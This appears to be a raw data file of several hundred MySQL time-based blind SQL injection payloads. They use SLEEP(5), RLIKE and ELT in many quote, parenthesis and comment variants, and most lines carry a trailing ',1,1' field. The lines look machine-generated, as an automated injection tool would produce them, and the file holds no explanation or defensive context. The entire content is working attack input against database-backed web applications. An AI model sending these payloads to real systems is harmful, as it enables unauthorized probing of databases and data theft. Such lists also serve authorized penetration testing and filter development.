' AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp) OR 'OvSa'='Srdw,1,1
') WHERE 2387=2387 AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp)-- kowN,1,1
""") WHERE 4308=4308 AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp)-- tkyj",1,1
) WHERE 6763=6763 AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp)-- rpTn,1,1
' WHERE 5701=5701 AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp)-- ytKt,1,1
""" WHERE 4327=4327 AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp)-- POnC",1,1
 WHERE 6534=6534 AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp)-- lMiH,1,1
'||(SELECT 0x5a725874 WHERE 1025=1025 AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp))||',1,1
'||(SELECT 0x586d794e FROM DUAL WHERE 8262=8262 AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp))||',1,1
'+(SELECT 0x6f6a4541 WHERE 5298=5298 AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp))+',1,1
||(SELECT 0x68656e75 FROM DUAL WHERE 6099=6099 AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp))||,1,1
||(SELECT 0x73754c7a WHERE 9195=9195 AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp))||,1,1
+(SELECT Yukw WHERE 9501=9501 AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp))+,1,1
+(SELECT 0x4c775a54 WHERE 5423=5423 AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp))+,1,1
')) AS OLQR WHERE 9587=9587 AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp)-- SuHr,1,1
""")) AS ZcBt WHERE 8058=8058 AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp)-- YoIJ",1,1
)) AS KEVt WHERE 3647=3647 AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp)-- bgsO,1,1
') AS qmbS WHERE 1470=1470 AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp)-- UhvN,1,1
""") AS IhAC WHERE 1167=1167 AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp)-- KGYx",1,1
) AS CITA WHERE 1376=1376 AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp)-- MXcy,1,1
` WHERE 9566=9566 AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp)-- uOIq,1,1
`) WHERE 8487=8487 AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp)-- dpyE,1,1
`=`` AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp) AND ``=`,1,1
"""="""" AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp) AND """"=""",1,1
]-(SELECT 0 WHERE 4267=4267 AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp))|[,1,1
' IN BOOLEAN MODE) AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp)#,1,1
) AND SLEEP(5)-- xMWF,1,1
') AND SLEEP(5)-- xzYS,1,1
' AND SLEEP(5)-- LrXR,1,1
""" AND SLEEP(5)-- Mdcq",1,1
) AND SLEEP(5) AND (7585=7585,1,1
)) AND SLEEP(5) AND ((3064=3064,1,1
))) AND SLEEP(5) AND (((4904=4904,1,1
 AND SLEEP(5),1,1
') AND SLEEP(5) AND ('OmBT'='OmBT,1,1
')) AND SLEEP(5) AND (('xVQi'='xVQi,1,1
'))) AND SLEEP(5) AND ((('JUyp'='JUyp,1,1
' AND SLEEP(5) AND 'AYTK'='AYTK,1,1
') AND SLEEP(5) AND ('glvS' LIKE 'glvS,1,1
')) AND SLEEP(5) AND (('NuqO' LIKE 'NuqO,1,1
'))) AND SLEEP(5) AND ((('IuQT' LIKE 'IuQT,1,1
%' AND SLEEP(5) AND 'fSun%'='fSun,1,1
' AND SLEEP(5) AND 'VCpl' LIKE 'VCpl,1,1
""") AND SLEEP(5) AND (""FIJB""=""FIJB",1,1
""")) AND SLEEP(5) AND ((""eSPO""=""eSPO",1,1
"""))) AND SLEEP(5) AND (((""kQrN""=""kQrN",1,1
""" AND SLEEP(5) AND ""dAAz""=""dAAz",1,1
""") AND SLEEP(5) AND (""uoAX"" LIKE ""uoAX",1,1
""")) AND SLEEP(5) AND ((""ZADh"" LIKE ""ZADh",1,1
"""))) AND SLEEP(5) AND (((""fWEN"" LIKE ""fWEN",1,1
""" AND SLEEP(5) AND ""Siui"" LIKE ""Siui",1,1
 AND SLEEP(5)-- XTBG,1,1
 AND SLEEP(5)# tiTm,1,1
' AND SLEEP(5) OR 'FGme'='Lsys,1,1
') WHERE 3990=3990 AND SLEEP(5)-- hcnQ,1,1
""") WHERE 2567=2567 AND SLEEP(5)-- KWHg",1,1
) WHERE 2383=2383 AND SLEEP(5)-- bXzS,1,1
' WHERE 6010=6010 AND SLEEP(5)-- uKOj,1,1
""" WHERE 3990=3990 AND SLEEP(5)-- Attw",1,1
 WHERE 8524=8524 AND SLEEP(5)-- MHQo,1,1
'||(SELECT 0x48655652 WHERE 6502=6502 AND SLEEP(5))||',1,1
'||(SELECT 0x65434953 FROM DUAL WHERE 5241=5241 AND SLEEP(5))||',1,1
'+(SELECT 0x69645a4d WHERE 4024=4024 AND SLEEP(5))+',1,1
||(SELECT 0x55695a73 FROM DUAL WHERE 4245=4245 AND SLEEP(5))||,1,1
||(SELECT 0x6d495a4f WHERE 3253=3253 AND SLEEP(5))||,1,1
+(SELECT wTks WHERE 1676=1676 AND SLEEP(5))+,1,1
+(SELECT 0x726c7854 WHERE 6926=6926 AND SLEEP(5))+,1,1
')) AS nwaq WHERE 1607=1607 AND SLEEP(5)-- UWVh,1,1
""")) AS AkuE WHERE 9431=9431 AND SLEEP(5)-- mdzM",1,1
)) AS mvhh WHERE 7181=7181 AND SLEEP(5)-- VYbe,1,1
') AS rqhr WHERE 2859=2859 AND SLEEP(5)-- WRyU,1,1
""") AS VdVj WHERE 2431=2431 AND SLEEP(5)-- oMse",1,1
) AS AHpC WHERE 9746=9746 AND SLEEP(5)-- sjBB,1,1
` WHERE 8882=8882 AND SLEEP(5)-- QRxb,1,1
`) WHERE 7801=7801 AND SLEEP(5)-- lnfX,1,1
`=`` AND SLEEP(5) AND ``=`,1,1
"""="""" AND SLEEP(5) AND """"=""",1,1
]-(SELECT 0 WHERE 3058=3058 AND SLEEP(5))|[,1,1
' IN BOOLEAN MODE) AND SLEEP(5)#,1,1
) AND SLEEP(5)#,1,1
') AND SLEEP(5)#,1,1
' AND SLEEP(5)#,1,1
""" AND SLEEP(5)#",1,1
)) AND SLEEP(5)#,1,1
))) AND SLEEP(5)#,1,1
 AND SLEEP(5)#,1,1
')) AND SLEEP(5)#,1,1
'))) AND SLEEP(5)#,1,1
%' AND SLEEP(5)#,1,1
""") AND SLEEP(5)#",1,1
""")) AND SLEEP(5)#",1,1
"""))) AND SLEEP(5)#",1,1
') WHERE 6991=6991 AND SLEEP(5)#,1,1
""") WHERE 9171=9171 AND SLEEP(5)#",1,1
) WHERE 1077=1077 AND SLEEP(5)#,1,1
' WHERE 7177=7177 AND SLEEP(5)#,1,1
""" WHERE 6487=6487 AND SLEEP(5)#",1,1
 WHERE 2261=2261 AND SLEEP(5)#,1,1
'||(SELECT 0x6864556e WHERE 6008=6008 AND SLEEP(5)#,1,1
'||(SELECT 0x466e5157 FROM DUAL WHERE 3851=3851 AND SLEEP(5)#,1,1
'+(SELECT 0x74664c73 WHERE 1376=1376 AND SLEEP(5)#,1,1
||(SELECT 0x7a674d58 FROM DUAL WHERE 5347=5347 AND SLEEP(5)#,1,1
||(SELECT 0x444a7a57 WHERE 1876=1876 AND SLEEP(5)#,1,1
+(SELECT KpYD WHERE 8513=8513 AND SLEEP(5)#,1,1
+(SELECT 0x426a4d6c WHERE 9048=9048 AND SLEEP(5)#,1,1
')) AS CWvV WHERE 7821=7821 AND SLEEP(5)#,1,1
""")) AS BwhY WHERE 8171=8171 AND SLEEP(5)#",1,1
)) AS Wprs WHERE 2947=2947 AND SLEEP(5)#,1,1
') AS GmxV WHERE 6158=6158 AND SLEEP(5)#,1,1
""") AS UuFu WHERE 4025=4025 AND SLEEP(5)#",1,1
) AS smWg WHERE 3498=3498 AND SLEEP(5)#,1,1
` WHERE 5723=5723 AND SLEEP(5)#,1,1
`) WHERE 1428=1428 AND SLEEP(5)#,1,1
) AND (SELECT 4943 FROM (SELECT(SLEEP(5)))YMWm)#,1,1
') AND (SELECT 4943 FROM (SELECT(SLEEP(5)))YMWm)#,1,1
' AND (SELECT 4943 FROM (SELECT(SLEEP(5)))YMWm)#,1,1
""" AND (SELECT 4943 FROM (SELECT(SLEEP(5)))YMWm)#",1,1
)) AND (SELECT 4943 FROM (SELECT(SLEEP(5)))YMWm)#,1,1
))) AND (SELECT 4943 FROM (SELECT(SLEEP(5)))YMWm)#,1,1
 AND (SELECT 4943 FROM (SELECT(SLEEP(5)))YMWm)#,1,1
')) AND (SELECT 4943 FROM (SELECT(SLEEP(5)))YMWm)#,1,1
'))) AND (SELECT 4943 FROM (SELECT(SLEEP(5)))YMWm)#,1,1
%' AND (SELECT 4943 FROM (SELECT(SLEEP(5)))YMWm)#,1,1
""") AND (SELECT 4943 FROM (SELECT(SLEEP(5)))YMWm)#",1,1
""")) AND (SELECT 4943 FROM (SELECT(SLEEP(5)))YMWm)#",1,1
"""))) AND (SELECT 4943 FROM (SELECT(SLEEP(5)))YMWm)#",1,1
') WHERE 3999=3999 AND (SELECT 4943 FROM (SELECT(SLEEP(5)))YMWm)#,1,1
""") WHERE 3206=3206 AND (SELECT 4943 FROM (SELECT(SLEEP(5)))YMWm)#",1,1
) WHERE 5460=5460 AND (SELECT 4943 FROM (SELECT(SLEEP(5)))YMWm)#,1,1
' WHERE 2782=2782 AND (SELECT 4943 FROM (SELECT(SLEEP(5)))YMWm)#,1,1
""" WHERE 4110=4110 AND (SELECT 4943 FROM (SELECT(SLEEP(5)))YMWm)#",1,1
 WHERE 9474=9474 AND (SELECT 4943 FROM (SELECT(SLEEP(5)))YMWm)#,1,1
'||(SELECT 0x4c505553 WHERE 2876=2876 AND (SELECT 4943 FROM (SELECT(SLEEP(5)))YMWm)#,1,1
'||(SELECT 0x64486670 FROM DUAL WHERE 4085=4085 AND (SELECT 4943 FROM (SELECT(SLEEP(5)))YMWm)#,1,1
'+(SELECT 0x4c474459 WHERE 7683=7683 AND (SELECT 4943 FROM (SELECT(SLEEP(5)))YMWm)#,1,1
||(SELECT 0x69674e4c FROM DUAL WHERE 3120=3120 AND (SELECT 4943 FROM (SELECT(SLEEP(5)))YMWm)#,1,1
||(SELECT 0x57505963 WHERE 4281=4281 AND (SELECT 4943 FROM (SELECT(SLEEP(5)))YMWm)#,1,1
+(SELECT iUUK WHERE 1101=1101 AND (SELECT 4943 FROM (SELECT(SLEEP(5)))YMWm)#,1,1
+(SELECT 0x53436e5a WHERE 3111=3111 AND (SELECT 4943 FROM (SELECT(SLEEP(5)))YMWm)#,1,1
')) AS mqlP WHERE 7111=7111 AND (SELECT 4943 FROM (SELECT(SLEEP(5)))YMWm)#,1,1
""")) AS zRfX WHERE 3311=3311 AND (SELECT 4943 FROM (SELECT(SLEEP(5)))YMWm)#",1,1
)) AS XXcy WHERE 7017=7017 AND (SELECT 4943 FROM (SELECT(SLEEP(5)))YMWm)#,1,1
') AS XgJm WHERE 1050=1050 AND (SELECT 4943 FROM (SELECT(SLEEP(5)))YMWm)#,1,1
""") AS CFMF WHERE 6155=6155 AND (SELECT 4943 FROM (SELECT(SLEEP(5)))YMWm)#",1,1
) AS yosv WHERE 9241=9241 AND (SELECT 4943 FROM (SELECT(SLEEP(5)))YMWm)#,1,1
` WHERE 7555=7555 AND (SELECT 4943 FROM (SELECT(SLEEP(5)))YMWm)#,1,1
`) WHERE 7516=7516 AND (SELECT 4943 FROM (SELECT(SLEEP(5)))YMWm)#,1,1
) RLIKE SLEEP(5)-- ZWCi,1,1
') RLIKE SLEEP(5)-- cXzQ,1,1
' RLIKE SLEEP(5)-- zPPn,1,1
""" RLIKE SLEEP(5)-- gWwx",1,1
) RLIKE SLEEP(5) AND (5980=5980,1,1
)) RLIKE SLEEP(5) AND ((8796=8796,1,1
))) RLIKE SLEEP(5) AND (((3577=3577,1,1
 RLIKE SLEEP(5),1,1
') RLIKE SLEEP(5) AND ('lKFf'='lKFf,1,1
')) RLIKE SLEEP(5) AND (('idWp'='idWp,1,1
'))) RLIKE SLEEP(5) AND ((('nIYn'='nIYn,1,1
' RLIKE SLEEP(5) AND 'AESg'='AESg,1,1
') RLIKE SLEEP(5) AND ('cGsE' LIKE 'cGsE,1,1
')) RLIKE SLEEP(5) AND (('RWIp' LIKE 'RWIp,1,1
'))) RLIKE SLEEP(5) AND ((('EhSb' LIKE 'EhSb,1,1
%' RLIKE SLEEP(5) AND 'vSXv%'='vSXv,1,1
' RLIKE SLEEP(5) AND 'WVPt' LIKE 'WVPt,1,1
""") RLIKE SLEEP(5) AND (""fsDd""=""fsDd",1,1
""")) RLIKE SLEEP(5) AND ((""Awgj""=""Awgj",1,1
"""))) RLIKE SLEEP(5) AND (((""IkcN""=""IkcN",1,1
""" RLIKE SLEEP(5) AND ""vjKr""=""vjKr",1,1
""") RLIKE SLEEP(5) AND (""JrVX"" LIKE ""JrVX",1,1
""")) RLIKE SLEEP(5) AND ((""WcSQ"" LIKE ""WcSQ",1,1
"""))) RLIKE SLEEP(5) AND (((""PGmP"" LIKE ""PGmP",1,1
""" RLIKE SLEEP(5) AND ""aKSa"" LIKE ""aKSa",1,1
 RLIKE SLEEP(5)-- JIwZ,1,1
 RLIKE SLEEP(5)# mgqR,1,1
' RLIKE SLEEP(5) OR 'RNoc'='xuFt,1,1
') WHERE 9088=9088 RLIKE SLEEP(5)-- wlFu,1,1
""") WHERE 6878=6878 RLIKE SLEEP(5)-- EnYr",1,1
) WHERE 3583=3583 RLIKE SLEEP(5)-- rdzd,1,1
' WHERE 5379=5379 RLIKE SLEEP(5)-- gyQg,1,1
""" WHERE 5906=5906 RLIKE SLEEP(5)-- uJrj",1,1
 WHERE 8553=8553 RLIKE SLEEP(5)-- srVh,1,1
'||(SELECT 0x6e504341 WHERE 7066=7066 RLIKE SLEEP(5))||',1,1
'||(SELECT 0x626a6c54 FROM DUAL WHERE 6742=6742 RLIKE SLEEP(5))||',1,1
'+(SELECT 0x59616870 WHERE 1136=1136 RLIKE SLEEP(5))+',1,1
||(SELECT 0x4a576b53 FROM DUAL WHERE 2987=2987 RLIKE SLEEP(5))||,1,1
||(SELECT 0x6b4c7276 WHERE 1399=1399 RLIKE SLEEP(5))||,1,1
+(SELECT ALvU WHERE 7107=7107 RLIKE SLEEP(5))+,1,1
+(SELECT 0x41504353 WHERE 8048=8048 RLIKE SLEEP(5))+,1,1
')) AS JoUi WHERE 3880=3880 RLIKE SLEEP(5)-- JcQi,1,1
""")) AS tCHr WHERE 7727=7727 RLIKE SLEEP(5)-- LPgp",1,1
)) AS IuMm WHERE 7081=7081 RLIKE SLEEP(5)-- bZBk,1,1
') AS Nfym WHERE 5024=5024 RLIKE SLEEP(5)-- yEAZ,1,1
""") AS ebaV WHERE 3204=3204 RLIKE SLEEP(5)-- dPfu",1,1
) AS RquE WHERE 9115=9115 RLIKE SLEEP(5)-- NgUL,1,1
` WHERE 2502=2502 RLIKE SLEEP(5)-- vNoc,1,1
`) WHERE 4291=4291 RLIKE SLEEP(5)-- gLZX,1,1
' IN BOOLEAN MODE) RLIKE SLEEP(5)#,1,1
) RLIKE SLEEP(5)#,1,1
') RLIKE SLEEP(5)#,1,1
' RLIKE SLEEP(5)#,1,1
""" RLIKE SLEEP(5)#",1,1
)) RLIKE SLEEP(5)#,1,1
))) RLIKE SLEEP(5)#,1,1
 RLIKE SLEEP(5)#,1,1
')) RLIKE SLEEP(5)#,1,1
'))) RLIKE SLEEP(5)#,1,1
%' RLIKE SLEEP(5)#,1,1
""") RLIKE SLEEP(5)#",1,1
""")) RLIKE SLEEP(5)#",1,1
"""))) RLIKE SLEEP(5)#",1,1
') WHERE 4585=4585 RLIKE SLEEP(5)#,1,1
""") WHERE 6886=6886 RLIKE SLEEP(5)#",1,1
) WHERE 7988=7988 RLIKE SLEEP(5)#,1,1
' WHERE 1346=1346 RLIKE SLEEP(5)#,1,1
""" WHERE 3750=3750 RLIKE SLEEP(5)#",1,1
 WHERE 8669=8669 RLIKE SLEEP(5)#,1,1
'||(SELECT 0x4965554e WHERE 6663=6663 RLIKE SLEEP(5)#,1,1
'||(SELECT 0x4b425771 FROM DUAL WHERE 2185=2185 RLIKE SLEEP(5)#,1,1
'+(SELECT 0x7a465459 WHERE 2804=2804 RLIKE SLEEP(5)#,1,1
||(SELECT 0x4f58426d FROM DUAL WHERE 3577=3577 RLIKE SLEEP(5)#,1,1
||(SELECT 0x7972595a WHERE 5557=5557 RLIKE SLEEP(5)#,1,1
+(SELECT gDLF WHERE 6443=6443 RLIKE SLEEP(5)#,1,1
+(SELECT 0x42584243 WHERE 4408=4408 RLIKE SLEEP(5)#,1,1
')) AS jpvz WHERE 4216=4216 RLIKE SLEEP(5)#,1,1
""")) AS fNJS WHERE 4605=4605 RLIKE SLEEP(5)#",1,1
)) AS HaLq WHERE 4044=4044 RLIKE SLEEP(5)#,1,1
') AS szku WHERE 4631=4631 RLIKE SLEEP(5)#,1,1
""") AS duaM WHERE 5175=5175 RLIKE SLEEP(5)#",1,1
) AS VYIo WHERE 5642=5642 RLIKE SLEEP(5)#,1,1
` WHERE 3217=3217 RLIKE SLEEP(5)#,1,1
`) WHERE 6085=6085 RLIKE SLEEP(5)#,1,1
) RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC)-- NWlI,1,1
') RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC)-- UAdk,1,1
' RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC)-- ZTso,1,1
""" RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC)-- fXLW",1,1
) RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC) AND (7764=7764,1,1
)) RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC) AND ((1030=1030,1,1
))) RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC) AND (((2379=2379,1,1
 RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC),1,1
') RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC) AND ('mBRC'='mBRC,1,1
')) RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC) AND (('zluD'='zluD,1,1
'))) RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC) AND ((('jtyR'='jtyR,1,1
' RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC) AND 'Hhxa'='Hhxa,1,1
') RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC) AND ('viAJ' LIKE 'viAJ,1,1
')) RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC) AND (('zfCt' LIKE 'zfCt,1,1
'))) RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC) AND ((('jUWV' LIKE 'jUWV,1,1
%' RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC) AND 'ZjCk%'='ZjCk,1,1
' RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC) AND 'GyYk' LIKE 'GyYk,1,1
""") RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC) AND (""dBfG""=""dBfG",1,1
""")) RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC) AND ((""sZkx""=""sZkx",1,1
"""))) RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC) AND (((""iJWV""=""iJWV",1,1
""" RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC) AND ""PJwu""=""PJwu",1,1
""") RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC) AND (""eDcK"" LIKE ""eDcK",1,1
""")) RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC) AND ((""awIW"" LIKE ""awIW",1,1
"""))) RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC) AND (((""Pzwt"" LIKE ""Pzwt",1,1
""" RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC) AND ""fgyf"" LIKE ""fgyf",1,1
 RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC)-- vqgz,1,1
 RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC)# jnhc,1,1
' RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC) OR 'YnWk'='FhKV,1,1
') WHERE 3703=3703 RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC)-- ZyTC,1,1
""") WHERE 2153=2153 RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC)-- OnZN",1,1
) WHERE 8960=8960 RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC)-- lXGQ,1,1
' WHERE 6955=6955 RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC)-- KBAd,1,1
""" WHERE 6971=6971 RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC)-- mzMN",1,1
 WHERE 3009=3009 RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC)-- Kebc,1,1
'||(SELECT 0x44654949 WHERE 3641=3641 RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC))||',1,1
'||(SELECT 0x51595374 FROM DUAL WHERE 5844=5844 RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC))||',1,1
'+(SELECT 0x4e657778 WHERE 7510=7510 RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC))+',1,1
||(SELECT 0x62494b55 FROM DUAL WHERE 1115=1115 RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC))||,1,1
||(SELECT 0x46506b6b WHERE 7106=7106 RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC))||,1,1
+(SELECT EzGs WHERE 2367=2367 RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC))+,1,1
+(SELECT 0x4f766249 WHERE 6402=6402 RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC))+,1,1
')) AS MyvV WHERE 2169=2169 RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC)-- SEyd,1,1
""")) AS qxWg WHERE 6630=6630 RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC)-- JDYo",1,1
)) AS rVOS WHERE 8679=8679 RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC)-- mDJh,1,1
') AS qmAC WHERE 8609=8609 RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC)-- oqkP,1,1
""") AS Wgbi WHERE 4512=4512 RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC)-- eDKL",1,1
) AS zhUe WHERE 7393=7393 RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC)-- jgbI,1,1
` WHERE 8090=8090 RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC)-- nBcj,1,1
`) WHERE 3906=3906 RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC)-- yGdx,1,1
' IN BOOLEAN MODE) RLIKE (SELECT 6322 FROM (SELECT(SLEEP(5)))hArC)#,1,1
) RLIKE (SELECT 7524 FROM (SELECT(SLEEP(5)))QfOp)#,1,1
') RLIKE (SELECT 7524 FROM (SELECT(SLEEP(5)))QfOp)#,1,1
' RLIKE (SELECT 7524 FROM (SELECT(SLEEP(5)))QfOp)#,1,1
""" RLIKE (SELECT 7524 FROM (SELECT(SLEEP(5)))QfOp)#",1,1
)) RLIKE (SELECT 7524 FROM (SELECT(SLEEP(5)))QfOp)#,1,1
))) RLIKE (SELECT 7524 FROM (SELECT(SLEEP(5)))QfOp)#,1,1
 RLIKE (SELECT 7524 FROM (SELECT(SLEEP(5)))QfOp)#,1,1
')) RLIKE (SELECT 7524 FROM (SELECT(SLEEP(5)))QfOp)#,1,1
'))) RLIKE (SELECT 7524 FROM (SELECT(SLEEP(5)))QfOp)#,1,1
%' RLIKE (SELECT 7524 FROM (SELECT(SLEEP(5)))QfOp)#,1,1
""") RLIKE (SELECT 7524 FROM (SELECT(SLEEP(5)))QfOp)#",1,1
""")) RLIKE (SELECT 7524 FROM (SELECT(SLEEP(5)))QfOp)#",1,1
"""))) RLIKE (SELECT 7524 FROM (SELECT(SLEEP(5)))QfOp)#",1,1
') WHERE 9247=9247 RLIKE (SELECT 7524 FROM (SELECT(SLEEP(5)))QfOp)#,1,1
""") WHERE 5702=5702 RLIKE (SELECT 7524 FROM (SELECT(SLEEP(5)))QfOp)#",1,1
) WHERE 5300=5300 RLIKE (SELECT 7524 FROM (SELECT(SLEEP(5)))QfOp)#,1,1
' WHERE 9925=9925 RLIKE (SELECT 7524 FROM (SELECT(SLEEP(5)))QfOp)#,1,1
""" WHERE 3007=3007 RLIKE (SELECT 7524 FROM (SELECT(SLEEP(5)))QfOp)#",1,1
 WHERE 6871=6871 RLIKE (SELECT 7524 FROM (SELECT(SLEEP(5)))QfOp)#,1,1
'||(SELECT 0x42635579 WHERE 2890=2890 RLIKE (SELECT 7524 FROM (SELECT(SLEEP(5)))QfOp)#,1,1
'||(SELECT 0x6143794f FROM DUAL WHERE 7029=7029 RLIKE (SELECT 7524 FROM (SELECT(SLEEP(5)))QfOp)#,1,1
'+(SELECT 0x6a6c6b42 WHERE 7417=7417 RLIKE (SELECT 7524 FROM (SELECT(SLEEP(5)))QfOp)#,1,1
||(SELECT 0x6856544b FROM DUAL WHERE 5833=5833 RLIKE (SELECT 7524 FROM (SELECT(SLEEP(5)))QfOp)#,1,1
||(SELECT 0x50645651 WHERE 3822=3822 RLIKE (SELECT 7524 FROM (SELECT(SLEEP(5)))QfOp)#,1,1
+(SELECT wHVX WHERE 8096=8096 RLIKE (SELECT 7524 FROM (SELECT(SLEEP(5)))QfOp)#,1,1
+(SELECT 0x6c645866 WHERE 2378=2378 RLIKE (SELECT 7524 FROM (SELECT(SLEEP(5)))QfOp)#,1,1
')) AS HXaN WHERE 3530=3530 RLIKE (SELECT 7524 FROM (SELECT(SLEEP(5)))QfOp)#,1,1
""")) AS nDUT WHERE 8432=8432 RLIKE (SELECT 7524 FROM (SELECT(SLEEP(5)))QfOp)#",1,1
)) AS hXjA WHERE 9883=9883 RLIKE (SELECT 7524 FROM (SELECT(SLEEP(5)))QfOp)#,1,1
') AS onCh WHERE 3980=3980 RLIKE (SELECT 7524 FROM (SELECT(SLEEP(5)))QfOp)#,1,1
""") AS tRMp WHERE 8116=8116 RLIKE (SELECT 7524 FROM (SELECT(SLEEP(5)))QfOp)#",1,1
) AS Jksx WHERE 2170=2170 RLIKE (SELECT 7524 FROM (SELECT(SLEEP(5)))QfOp)#,1,1
` WHERE 6566=6566 RLIKE (SELECT 7524 FROM (SELECT(SLEEP(5)))QfOp)#,1,1
`) WHERE 5797=5797 RLIKE (SELECT 7524 FROM (SELECT(SLEEP(5)))QfOp)#,1,1
") AND ELT(4539=4539,SLEEP(5))-- BnIO",1,1
"') AND ELT(4539=4539,SLEEP(5))-- nXHM",1,1
"' AND ELT(4539=4539,SLEEP(5))-- lQIJ",1,1
""" AND ELT(4539=4539,SLEEP(5))-- SjmD",1,1
